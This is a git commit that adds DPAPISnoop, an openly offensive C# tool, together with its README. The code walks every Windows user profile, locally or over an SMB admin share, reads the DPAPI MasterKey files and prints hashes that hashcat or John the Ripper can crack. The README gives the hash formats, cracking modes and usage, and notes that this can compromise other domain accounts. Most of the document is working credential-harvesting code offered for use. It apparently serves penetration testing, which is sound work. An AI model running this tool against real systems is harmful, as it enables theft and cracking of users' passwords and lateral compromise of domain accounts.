eefe840545720333aa6c78837e63b0c97e9d029c
Lefteris Panos <9055652+leftp@users.noreply.github.com>
2023-04-02 14:20:07 +0300

    Add files via upload

---
+++ DPAPISnoop/Program.cs
@@ -0,0 +1,154 @@
+﻿using System;
+using System.IO;
+using System.Linq;
+using System.Text;
+
+
+namespace DPAPISnoop
+{
+    internal static class Program
+    {
+        public static string ByteArrayToString(byte[] ba)
+        {
+            var hex = new StringBuilder(ba.Length * 2);
+            foreach (var b in ba)
+                hex.AppendFormat("{0:x2}", b);
+            return hex.ToString();
+        }
+        public static byte[] GetMasterKey(byte[] masterKeyBytes)
+        {
+            // helper to extract domain masterkey subbytes from a master key blob
+
+            var offset = 96;
+
+            var masterKeyLen = BitConverter.ToInt64(masterKeyBytes, offset);
+            offset += 4 * 8; // skip the key length headers
+
+            var masterKeySubBytes = new byte[masterKeyLen];
+            Array.Copy(masterKeyBytes, offset, masterKeySubBytes, 0, masterKeyLen);
+
+            return masterKeySubBytes;
+        }
+        public static void Gethash(byte[] masterKeyBytes, string sid, string username, bool isDomain)
+        {
+            var mkBytes = GetMasterKey(masterKeyBytes);
+
+            var offset = 4;
+            var salt = new byte[16];
+
+            Array.Copy(mkBytes, 4, salt, 0, 16);
+            var iv = ByteArrayToString(salt);
+            //Console.WriteLine($"IV:{iv}");
+            offset += 16;
+
+            var rounds = BitConverter.ToInt32(mkBytes, offset);
+            //Console.WriteLine($"Rounds:{ rounds}");
+            offset += 4;
+
+            var algHash = BitConverter.ToInt32(mkBytes, offset);
+            //Console.WriteLine($"cipher_algo:{algHash}");
+            offset += 4;
+
+            var algCrypt = BitConverter.ToInt32(mkBytes, offset);
+            //Console.WriteLine($"hmac_algo:{algCrypt}");
+            offset += 4;
+
+            var encData = new byte[mkBytes.Length - offset];
+            Array.Copy(mkBytes, offset, encData, 0, encData.Length);
+            var cipher = ByteArrayToString(encData);
+            //Console.WriteLine($"encData:{cipher}");
+
+
+            var version = 0;
+            var hmacAlgo = "";
+            var cipherAlgo = "";
+            switch (algCrypt)
+            {
+                case 26115 when algHash == 32777 || algHash == 32772:
+                    version = 1;
+                    hmacAlgo = "sha1";
+                    cipherAlgo = "des3";
+                    break;
+                case 26128 when algHash == 32782:
+                    version = 2;
+                    hmacAlgo = "sha512";
+                    cipherAlgo = "aes256";
+                    break;
+                default:
+                    Console.WriteLine("unknown hash");
+                    break;
+            }
+            if(isDomain)
+            {
+                //Console.WriteLine($"{username}:$DPAPImk${version}*2*{sid}*{cipher_algo}*{hmac_algo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
+                Console.WriteLine($"{username}:$DPAPImk${version}*3*{sid}*{cipherAlgo}*{hmacAlgo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
+            }
+            else 
+            {
+                Console.WriteLine($"{username}:$DPAPImk${version}*1*{sid}*{cipherAlgo}*{hmacAlgo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
+            }
+        }
+
+        public static void Main(string[] args)
+        {
+            try
+            {
+                string rootDir;
+
+                if (args.Length < 1)
+                {
+                    rootDir = Environment.GetEnvironmentVariable("HOMEDRIVE");
+                }
+                else
+                {
+                    rootDir = args[0];
+                    rootDir.TrimEnd('\\');
+                }
+                var userDirs = Directory.GetDirectories(rootDir + "\\Users");
+                foreach (var dir in userDirs)
+                {
+                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users") || dir.Contains(".NET v") || dir.Contains("MSSQL$"))
+                        continue;
+
+                    var userDpapiBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Protect\\";
+                    if (!Directory.Exists(userDpapiBasePath))
+                        continue;
+
+                    var username = dir.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
+                    var directories = Directory.GetDirectories(userDpapiBasePath);
+                    
+                    foreach (var directory in directories)
+                    {
+                        var sid = directory.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
+                        var isDomain = false;
+                        var directoryInfo = new DirectoryInfo(directory);
+                        var files = directoryInfo.GetFiles();
+                        if (files.Any(x => x.Name.StartsWith("BK-")))
+                        {
+                            isDomain = true;
+                        }
+                        foreach (var file in files.OrderByDescending(f => f.LastWriteTime))
+                        {
+                            if (file.Name.StartsWith("Preferred") || file.Name.StartsWith("BK") ||
+                                !Guid.TryParse(file.Name, out _)) continue;
+                            var masterKeyBytes = File.ReadAllBytes(file.FullName);
+                            try
+                            {
+                                Gethash(masterKeyBytes, sid, username, isDomain);
+                                break;
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[!] Error triaging {0} : {1}", file.FullName, e.Message);
+                            }
+                        }
+                    }
+                }
+            }
+            catch(Exception ex) 
+            {
+                Console.WriteLine($"[!] Exception happened: {ex.Message} & {ex.InnerException}");
+            }
+        }
+    }
+}
--- README.md
+++ README.md
@@ -1,2 +1,68 @@
 # DPAPISnoop
-A C# tool to output crackable DPAPI hashes from user MasterKeys
+A C# tool to output crackable DPAPI hashes from user MasterKeys.
+
+MasterKeys are encrypted with the domain password of the user. Cracking such a key can lead to the compromise of other domain accounts.
+
+Based on DPAPImk2john at https://github.com/openwall/john/blob/6ed33a7f10f4fa19a4a995cf0fa099d6169fdcbf/run/DPAPImk2john.py
+
+# Info
+DPAPISnoop once run, it will iterate through every user folder, grab the most recent MasterKey under `C:\Users\User\AppData\Roaming\Microsoft\Protect\{SID}\{GUID}` and output a hashcat/JtR crackable hash.
+
+The tool can be run either in a local or remote context (SMB) after having admin privileges.
+
+The hash can then be attempted to be cracked with Hashcat / JtR. 
+
+Depending on the operating system, we have different type of hashes, where preWin7 DES3 was in use.
+  * Version 1 = des3 + sha1 (<=Vista)
+  * Version 2 = aes256 + sha512 (>=Win7)
+
+Depending if the user a local account or domain account, the context changes, with:
+  * Context 1: Local User
+  * Context 2: Domain User domain1607-
+  * Context 3: Domain User domain1607+
+
+Generated hash is in the form of:
+
+```
+$"{username}:$DPAPImk${version}*{Context}*{sid}*{cipherAlgo}*{hmacAlgo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
+```
+**CAVEAT**
+
+There is no programatic way to differentiate between domain1607- / domain1607+ although it appears that Context 3 was introduced after Windows 10 version 1607 (build 14393).
+The tool currently outputs only Context 3 but feel free to uncomment L#83 
+
+Hashcat supports the following hashes:
+* -m 15300 for masterkey file v1 (context 1 / 2)
+* -m 15310 for masterkey file v1 (context 3)
+* -m 15900 for masterkey file v2 (context 1 / 2)
+* -m 15910 for masterkey file v2 (context 3)
+
+
+# Usage
+DPAPISnoop.exe [\\\\server\\C$]
+
+
+
+# Useful Refereneces
+www.synacktiv.ninja/ressources/univershell_2017_dpapi.pdf
+
+https://github.com/hashcat/hashcat/pull/1238
+
+https://github.com/openwall/john/pull/3419
+
+https://github.com/hashcat/hashcat/pull/3208
+
+https://github.com/hashcat/hashcat/pull/1365
+
+https://github.com/hashcat/hashcat/issues/3189
+
+https://github.com/openwall/john/blob/6ed33a7f10f4fa19a4a995cf0fa099d6169fdcbf/run/DPAPImk2john.py
+
+https://github.com/dfirfpi/dpapilab
+
+https://github.com/jordanbtucker/dpapick
+https://github.com/GhostPack/SharpDPAPI
+
+# Author
+Lefteris (lefty) Panos / @lefterispan
+Shouts to @eks_perience
